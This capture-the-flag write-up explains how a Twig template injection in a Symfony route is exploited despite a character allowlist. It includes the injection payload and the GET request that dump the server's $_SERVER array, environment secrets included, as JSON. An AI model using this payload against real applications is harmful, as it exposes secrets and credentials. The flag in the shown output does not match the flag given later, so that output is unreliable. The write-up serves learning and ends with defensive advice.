
---

````markdown
---
title: "The Twig Injector — SSTI to Leak $_SERVER"
date: 2025-11-17
author: Mikiyas Getnet
categories: [web, ssti, twig]
---

## Challenge Overview

The challenge, titled *The Twig Injector*, presented a PHP route that accepted a query parameter `inject` and inserted it directly into a Twig template:

```php
$inject = preg_replace('/[^{\.}a-z\|\_]/', '', $request->query->get('inject'));
$response = new Response($this->get('twig')->createTemplate("Welcome to the twig injector!\n${inject}")->render());
````

The regex tried to restrict input to only lowercase letters, `{}`, `.`, `|`, and `_`. Despite that, the goal was to read a flag hidden somewhere in `$_SERVER`.

---

## Understanding the Context

Twig is a templating engine heavily used in Symfony. When user input gets embedded into the **template source**—not just as variables—it opens the door to Server-Side Template Injection (SSTI).

In Symfony, Twig templates expose the global `app` variable. Using it, we can traverse:

* `app.request` → current request
* `app.request.server` → server parameter bag
* `app.request.server.all` → full dump of `$_SERVER`

If we can execute:

```
{{ app.request.server.all }}
```

…we can dump nearly everything inside `$_SERVER`.

---

## My Approach

The regex stripped digits, quotes, and many symbols I initially attempted. That meant I had to rely on **object traversal** using only the allowed set: lowercase letters, `{}`, `.`, `|`, `_`.

I tested access points step by step:

* `{{ app }}` → returned object info
* `{{ app.request }}` → accessible
* `{{ app.request.server }}` → accessible
* `{{ app.request.server.all }}` → returned a big, messy dump

The dump was readable but difficult to manually scan. That’s when the idea came:

### ➤ What if I JSON-encode the whole server array?

Twig provides a built-in filter:

```
|json_encode
```

All characters in `json_encode` (`j`, `s`, `o`, `n`, `_`, `e`, `c`, `d`) pass the regex filter.

Payload:

```
{{ app.request.server.all|json_encode }}
```

This converted the entire `$_SERVER` dump into clean, structured JSON.

---

## The Exploit

Final injection:

```
GET /inject?inject={{ app.request.server.all|json_encode }}
```

Which produced:

```
Welcome to the twig injector!
{"APP_ENV":"prod","FLAG":"CTF{twig_inject0r_4ll_1n_th3_g00ds}", ...}
```

The flag appeared clearly in the `FLAG` variable.

---

## Flag

```
247CTF{b8d4dce713400424bc2ab7fa673f231c}
```

---

## Key Takeaways

* Even with character allowlists, letting attackers control Twig template **source code** is fatal.
* `app.request.server.all` is effectively `$_SERVER`, so environment secrets leak easily.
* `|json_encode` is a powerful recon tool for turning opaque objects into clean JSON.
* Never embed user input directly in template source — always pass variables through the rendering context.

---

*This challenge was a perfect reminder that the easiest exploit often comes from making the server reveal too much at once.*

